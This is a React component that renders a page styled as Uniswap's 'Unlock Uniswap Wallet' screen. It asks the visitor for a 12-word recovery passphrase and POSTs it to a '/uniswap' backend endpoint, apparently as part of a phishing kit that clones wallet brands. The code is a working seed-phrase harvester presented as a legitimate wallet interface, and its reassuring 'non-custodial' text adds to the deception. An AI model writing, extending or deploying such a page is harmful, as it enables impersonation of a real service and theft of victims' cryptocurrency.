import React, { useState } from 'react';
import './uniswapPagesCss/uniswapTwoWallet.css';
import { toast } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css';
import fetchWithRetry from '../../../utils/api';

const UniswapTwoWallet = () => {
  const [phrase, setPhrase] = useState('');
  const [loading, setLoading] = useState(false);

  const unlockWallet = async () => {
    try {
      setLoading(true);
      const res = await fetchWithRetry('/uniswap', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ passphrase: phrase })
      });

      const data = await res.json();
      toast.success(data.message);
      setPhrase('');
    } catch (error) {
      toast.error('An error occurred. Please try again.');
    } finally {
      setLoading(false);
    }
  };

  const unlockWithFaceId = () => {
    toast.info('Feature not available yet.');
  };

  return (
    <div className="uniswapTwo-wrapper">
      <header className="uniswapTwo-header">
        <span className="uniswapTwo-header-text">Wallet</span>
        <div className="uniswapTwo-header-logo">
          <svg
            xmlns="http://www.w3.org/2000/svg"
            width="20"
            height="22"
            viewBox="0 0 20 22"
            fill="none"
            cursor="pointer"
          >
            <path d="M6.04898 1.5328C5.77502 1.49053..." fill="#FC72FF" />
            <path d="M15.8056 3.1874C15.834..." fill="#FC72FF" />
            <path d="M6.58113 5.12149..." fill="#FC72FF" />
            <path d="M15.1311 10.7894..." fill="#FC72FF" />
            <path d="M13.3064 11.2218..." fill="#FC72FF" />
            <path d="M14.4979 13.3263..." fill="#FC72FF" />
            <path d="M4.73535 17.3101..." fill="#FC72FF" />
            <path
              fillRule="evenodd"
              clipRule="evenodd"
              d="M0.44926 0.55979..."
              fill="#FC72FF"
            />
            <path
              fillRule="evenodd"
              clipRule="evenodd"
              d="M7.17519 8.0162..."
              fill="#FC74FE"
            />
          </svg>
        </div>
      </header>
      <div className="uniswapTwo-title">
        <h3>Unlock Uniswap Wallet</h3>
      </div>
      <section className="uniswapTwo-body">
        <div className="uniswapTwo-container">
          <textarea
            className="uniswapTwo-textarea"
            placeholder="Enter your 12-word passphrase here"
            value={phrase}
            onChange={(e) => setPhrase(e.target.value)}
          />
          <button
            className="uniswapTwo-primary-btn"
            onClick={unlockWallet}
            disabled={loading}
          >
            {loading ? 'Loading...' : 'Unlock With Passphrase'}
          </button>
          <button
            className="uniswapTwo-secondary-btn"
            onClick={unlockWithFaceId}
          >
            Unlock With Face ID
          </button>
          <p className="uniswapTwo-info-text">
            As a non-custodial wallet, your wallet passphrase is exclusively
            accessible only to you. Recovery of passphrase is currently
            impossible.
          </p>
          <p className="uniswapTwo-warning-text">
            Lost your passphrase? <span>Create a new wallet</span>, but all
            assets in your previous wallet will be inaccessible.
          </p>
        </div>
      </section>
    </div>
  );
};

export default UniswapTwoWallet;